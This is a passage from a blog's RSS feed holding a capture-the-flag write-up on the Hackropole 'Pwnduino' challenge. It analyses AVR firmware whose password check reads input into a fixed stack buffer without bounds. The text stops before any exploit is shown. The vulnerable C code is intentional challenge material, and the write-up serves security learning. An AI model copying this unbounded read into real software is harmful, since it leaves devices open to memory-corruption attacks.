@@ -1,0 +1,333 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Avr on yocvito website</title>
+    <link>//localhost:1313/tags/avr/</link>
+    <description>Recent content in Avr on yocvito website</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 30 Oct 2024 15:44:39 +0100</lastBuildDate><atom:link href="//localhost:1313/tags/avr/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PWN: AVR exploitation</title>
+      <link>//localhost:1313/posts/pwn_hackropole-pwnduino/</link>
+      <pubDate>Wed, 30 Oct 2024 15:44:39 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/pwn_hackropole-pwnduino/</guid>
+      <description>&lt;h1 id=&#34;pwn-hackropole---pwnduino&#34;&gt;PWN: Hackropole - Pwnduino&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackropole.fr/fr/challenges/pwn/fcsc2023-pwn-pwnduino/&#34;&gt;This challenge&lt;/a&gt; is about reversing and exploiting an &lt;code&gt;AVR&lt;/code&gt; board (it&amp;rsquo;s a CPU architecture by &lt;em&gt;Atmel&lt;/em&gt; used in embedded devices).&lt;/p&gt;
+&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge Description&lt;/h2&gt;
+&lt;p&gt;An industrial system uses an AVR board to store secrets and performs crypto primitives (calculate a custom &lt;code&gt;CRC&lt;/code&gt;). We have access to the &lt;code&gt;debug&lt;/code&gt; firmware and the source code. The AVR board service is accessible at &lt;code&gt;localhost:4000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s first analyze the exposed service. We connect to it with &lt;code&gt;socat&lt;/code&gt; and are prompted to enter a password until it got succesfully validated. It doesn&amp;rsquo;t seem we can access other features until we enter correct password.&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;pwn-hackropole---pwnduino&#34;&gt;PWN: Hackropole - Pwnduino&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackropole.fr/fr/challenges/pwn/fcsc2023-pwn-pwnduino/&#34;&gt;This challenge&lt;/a&gt; is about reversing and exploiting an &lt;code&gt;AVR&lt;/code&gt; board (it&amp;rsquo;s a CPU architecture by &lt;em&gt;Atmel&lt;/em&gt; used in embedded devices).&lt;/p&gt;
+&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge Description&lt;/h2&gt;
+&lt;p&gt;An industrial system uses an AVR board to store secrets and performs crypto primitives (calculate a custom &lt;code&gt;CRC&lt;/code&gt;). We have access to the &lt;code&gt;debug&lt;/code&gt; firmware and the source code. The AVR board service is accessible at &lt;code&gt;localhost:4000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s first analyze the exposed service. We connect to it with &lt;code&gt;socat&lt;/code&gt; and are prompted to enter a password until it got succesfully validated. It doesn&amp;rsquo;t seem we can access other features until we enter correct password.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ socat tcp:localhost:4000 -
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;KO :-&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; Bad password ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please enter your passphrase to compute CRC:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pass 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;KO :-&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; Bad password ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please enter your passphrase to compute CRC:
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Project Structure:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;We have two C files &lt;code&gt;main.c&lt;/code&gt; and &lt;code&gt;uart.c&lt;/code&gt; with their associated headers, which should holds the firmware logic. The header file &lt;code&gt;secrets_debug.h&lt;/code&gt; (or &lt;code&gt;secrets_prod.h&lt;/code&gt; for production) contains the secrets we want to leak (password and flag).&lt;/p&gt;
+&lt;p&gt;By looking at the &lt;code&gt;Makefile.debug&lt;/code&gt; file, we can retrieve the AVR board running the firmware which is an &lt;code&gt;ATmega2560&lt;/code&gt; and is compiled with &lt;code&gt;avr-gcc&lt;/code&gt;.
+The &lt;code&gt;EEPROM&lt;/code&gt; section is removed from the firmware during compilation process.&lt;/p&gt;
+&lt;p&gt;We will now explore the source code to understand logic and unveil potential vulns. The &lt;code&gt;main.c&lt;/code&gt; file appears to be of first interest, we briefly look at &lt;code&gt;uart.c&lt;/code&gt; to confirm it&amp;rsquo;s a simple &lt;code&gt;UART&lt;/code&gt; interface. We will assume it&amp;rsquo;s not vulnerable for now, and eventually look at it if needed.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The UART interface could, indeed, be interesting because implementing low level protocols need to be done in a careful way to avoid memory corruptions. But for this challenge, it&amp;rsquo;s seems not to be the primary target and just here for communication logic.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;main.c:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The main function remains simple. It initializes the UART interface, remove existing data in UART streams and run the main loop.&lt;/p&gt;
+&lt;p&gt;The later asks for the password and check if it&amp;rsquo;s correct (&lt;code&gt;password_check&lt;/code&gt; function, we will look at it later). If not, it displays an error message and jump to loop start. Otherwise, it computes the CRC (an &lt;code&gt;uint8_t&lt;/code&gt;) using the secret stored in &lt;code&gt;FLASH&lt;/code&gt; memory (retrieved using &lt;code&gt;pgm_read_byte&lt;/code&gt; AVR primitive) and write it to the EEPROM.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;avr/io.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;avr/pgmspace.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;avr/eeprom.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;main.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;uart.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#if defined(PRODUCTION)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;secrets_prod.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#else
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;secrets_debug.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SECRET_SIZE (sizeof(secret) - 1)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get_secret_address&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; secret;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;compute_secret_crc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; crc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, i;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_secret_address&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; SECRET_SIZE; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		crc &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pgm_read_byte&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(s[i]));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; crc;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;passwd_check&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buff[&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(passwd)];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; check;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;memset&lt;/span&gt;(buff, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buff));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_get&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	check &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(passwd); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		check &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pgm_read_byte&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(passwd[i])));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; check;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_init&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_flush&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== Welcome!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter your passphrase to compute CRC:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;passwd_check&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; crc;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK! Computing the secret CRC&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			crc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;compute_secret_crc&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Writing CRC to EEPROM ...&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;eeprom_write_byte&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, crc);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;KO :-( Bad password ...&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From here, we can say that the primary target for exploiting the challenge is the &lt;code&gt;passwd_check&lt;/code&gt; function, because it&amp;rsquo;s the only way to interact with the program if we don&amp;rsquo;t have the password yet.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;passwd_check:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The function is using UART primitives to read the user input into a local stack buffer (&lt;code&gt;buff&lt;/code&gt;) with fixed size (&lt;code&gt;sizeof(passwd)&lt;/code&gt;, 17 bytes). It then xor the input with the password stored in FLASH memory, add the result to an accumulator (&lt;code&gt;check&lt;/code&gt;) and return the final result (which should be &lt;code&gt;0&lt;/code&gt; on success).&lt;/p&gt;
+&lt;p&gt;The problem here is that the user input retrieving code is not bounded on the size of &lt;code&gt;buff&lt;/code&gt; and only stop when reaching an &lt;code&gt;&#39;\n&#39;&lt;/code&gt; character. This means we can overflow the buffer and write arbitrary data onto the stack, which could lead to code execution.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buff[&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(passwd)];      &lt;span style=&#34;color:#75715e&#34;&gt;// allocate to a certain size
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; check;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
